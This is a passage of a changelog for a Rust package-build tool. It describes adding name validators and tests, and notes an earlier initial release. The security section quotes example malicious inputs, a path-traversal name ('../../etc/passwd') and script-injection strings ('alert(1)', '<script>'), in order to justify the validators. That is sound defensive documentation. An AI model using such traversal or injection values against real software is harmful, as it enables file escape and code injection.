  rejection path that no longer exists). Replaced by the positive
  tests below.

### Security

Added explicit `validate_component_name` and `validate_package_name`
helpers that run at the top of `build_package`, before any I/O.
Component names from the manifest flow into:

- File paths via `out_dir.join(format!("{component}.{ext}"))` — a
  malicious manifest entry like `../../etc/passwd` would escape
  the dist directory.
- The generated `index.html`, `index.js`, and
  `MosaicPackage.props` files — a name like `Grid"; alert(1)//`
  or `Grid --><script>` would inject into the aggregated
  comment/import/XML.
- The XAML branch writes THREE files per component, tripling the
  blast radius.

The TOML parser catches some malformed names (`"` characters) at
manifest-parse time, but quote-free traversal/injection (`../foo`,
`Grid<script>`) sneaks past. The validators are the second line of
defence — they enforce strict `[A-Za-z][A-Za-z0-9_]*` for
components (matches the PascalCase convention every existing
package uses) and `[a-z][a-z0-9-]*` for packages (matches the
`mosaic-pkg-*` kebab convention). New `BuildError::UnsafeName`
variant carries `kind` (`"component"` / `"package"`), the
offending name, and a one-line reason.

The vector was caught during the U29-2 follow-up security review;
the existing React/SwiftUI/Qt paths were affected too — the
validators close the vector for all six backends at once.

### Tests

- 4 new positive tests:
  - `html_backend_writes_html_fragment_per_component`
  - `webcomponent_backend_writes_js_per_component`
  - `xaml_backend_writes_triple_per_component_and_props_fragment`
  - `multi_component_builds_on_html_webcomponent_xaml`
- 6 new security-boundary tests:
  - `component_name_with_path_traversal_is_rejected`
  - `component_name_with_slash_is_rejected`
  - `component_name_with_injection_characters_is_rejected`
  - `package_name_validation_rejects_unsafe_shapes`
  - `standard_component_names_pass_validation`
  - `standard_package_names_pass_validation`
- Test count: 13 → 23 passing.

## [0.1.0] - 2026-05-19

### Added

- Initial release implementing **UI29 §4.3** (per-backend package-artifact
  build mode).
- `Backend` enum: `React`, `SwiftUI`, `Qt`, `WebComponent`, `Html`.
- `BuildOptions` (input), `BuildResult` (output), `BuildError` (failure
  modes).
- `build_package(opts)` entry point: parses
  `<package_root>/mosaic-package.toml`, compiles every exported
  component's three-file triple through `mosmodel-compiler` +
  `moslayout-compiler` + `mosstyle-compiler`, and hands the IRs to the
  chosen backend's `from_pipeline` function.
- Per-backend index emitters: `index.ts` for React, `index.swift` for
  SwiftUI, `qmldir` for Qt.
- Defensive fallback for missing `.msl`: synthesise an empty
  `style <Component> { }` source so the pipeline still produces a valid
  artifact.
- `WebComponent` and `Html` backends return `BuildError::UnsupportedBackend`
  pending their respective kernel-completion PRs.
- 14 unit tests covering empty packages, single/multi-component builds for
  all three wired backends, missing-source and malformed-source error
  paths, output-directory auto-creation, optional `.msl` fallback, and
  index/qmldir generation.
